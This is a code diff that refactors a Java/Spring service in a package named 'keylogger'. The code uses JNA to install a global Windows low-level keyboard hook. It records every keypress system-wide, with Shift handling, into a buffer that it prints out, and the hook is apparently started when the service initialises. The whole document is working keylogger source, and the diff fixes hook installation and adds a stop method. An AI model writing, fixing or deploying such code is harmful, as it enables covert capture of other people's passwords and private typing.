@@ -1,11 +1,15 @@
 package com.badar.keylogger.Services;
 
 import com.badar.keylogger.Helpers.KeyCodeConverter;
+import com.sun.jna.Native;
 import com.sun.jna.Pointer;
-import com.sun.jna.platform.win32.*;
-import com.sun.jna.platform.win32.WinDef.LRESULT;
-import com.sun.jna.platform.win32.WinDef.WPARAM;
-import com.sun.jna.platform.win32.WinUser.*;
+import com.sun.jna.platform.win32.WinDef.*;
+import com.sun.jna.platform.win32.WinUser;
+import com.sun.jna.platform.win32.WinUser.HHOOK;
+import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
+import com.sun.jna.platform.win32.WinUser.MSG;
+import com.sun.jna.win32.StdCallLibrary;
+import com.sun.jna.win32.W32APIOptions;
 import jakarta.annotation.PostConstruct;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -15,11 +19,29 @@ import org.springframework.stereotype.Service;
 public class GlobalKeyListenerService {
     private boolean leftShiftPressed = false;
     private boolean rightShiftPressed = false;
-    private StringBuilder storedInput = new StringBuilder();
+    private final StringBuilder storedInput = new StringBuilder();
+    private final Object inputLock = new Object();
     private static HHOOK hHook;
-    private static final User32 user32 = User32.INSTANCE;
 
     private static final Logger logger = LoggerFactory.getLogger(GlobalKeyListenerService.class);
+
+    public static final User32Extended user32 = User32Extended.INSTANCE;
+
+    public interface User32Extended extends StdCallLibrary {
+        User32Extended INSTANCE = Native.load("user32", User32Extended.class, W32APIOptions.UNICODE_OPTIONS);
+
+        // Correct function signatures
+        HHOOK SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, HMODULE hMod, int dwThreadId);
+        LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
+        boolean UnhookWindowsHookEx(HHOOK hhk);
+
+        int GetMessage(MSG lpMsg, HWND hWnd, int wMsgFilterMin, int wMsgFilterMax);
+        boolean TranslateMessage(MSG lpMsg);
+        LRESULT DispatchMessage(MSG lpMsg);
+
+        short GetKeyState(int vKey);
+        HMODULE GetModuleHandle(String lpModuleName);
+    }
 
     @PostConstruct
     public void init() {
@@ -28,47 +50,56 @@ public class GlobalKeyListenerService {
     }
 
     public void startKeylogger() {
-        LowLevelKeyboardProc keyboardHook = new LowLevelKeyboardProc() {
-            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
-                if (nCode >= 0) {
-                    if (wParam.intValue() == WinUser.WM_KEYDOWN) {
-                        // Track shift state
-                        if (info.vkCode == WinUser.VK_LSHIFT) {
-                            leftShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
-                        }
-                        else if (info.vkCode == WinUser.VK_RSHIFT) {
-                            rightShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
-                        }
-                        if(wParam.intValue() == WinUser.WM_KEYDOWN){
-                            boolean isShiftActive = leftShiftPressed || rightShiftPressed;
-                        String keypressed = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
-                        storedInput.append(keypressed);
+        LowLevelKeyboardProc keyboardHook = (nCode, wParam, info) -> {
+            if (nCode >= 0) {
+                // Track shift state
+                if (info.vkCode == WinUser.VK_LSHIFT) {
+                    leftShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
+                }
+                else if (info.vkCode == WinUser.VK_RSHIFT) {
+                    rightShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
+                }
+
+                // Process key presses
+                if (wParam.intValue() == WinUser.WM_KEYDOWN) {
+                    boolean isShiftActive = leftShiftPressed || rightShiftPressed;
+                    String keyChar = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
+                    synchronized(inputLock) {
+                        storedInput.append(keyChar);
                         System.out.println(storedInput);
                     }
-                    }
                 }
-                return user32.CallNextHookEx(hHook, nCode, wParam, new WinDef.LPARAM(Pointer.nativeValue(info.getPointer())));
             }
+            return user32.CallNextHookEx(hHook, nCode, wParam, new LPARAM(Pointer.nativeValue(info.getPointer())));
         };
 
         hHook = user32.SetWindowsHookEx(
                 WinUser.WH_KEYBOARD_LL,
                 keyboardHook,
-                Kernel32.INSTANCE.GetModuleHandle(null),
+                null,  // Use null for global hooks
                 0
         );
 
-        // Message loop
+        if (hHook == null) {
+            logger.error("Failed to install keyboard hook");
+            return;
+        }
+
+        logger.info("Keyboard hook installed successfully");
+
+        // Message pump
         MSG msg = new MSG();
         while (user32.GetMessage(msg, null, 0, 0) != 0) {
             user32.TranslateMessage(msg);
             user32.DispatchMessage(msg);
         }
-
-        user32.UnhookWindowsHookEx(hHook);
     }
 
-    public void stopLogger(){
-
+    public void stopLogger() {
+        if (hHook != null) {
+            user32.UnhookWindowsHookEx(hHook);
+            hHook = null;
+            logger.info("Keyboard hook uninstalled");
+        }
     }
 }
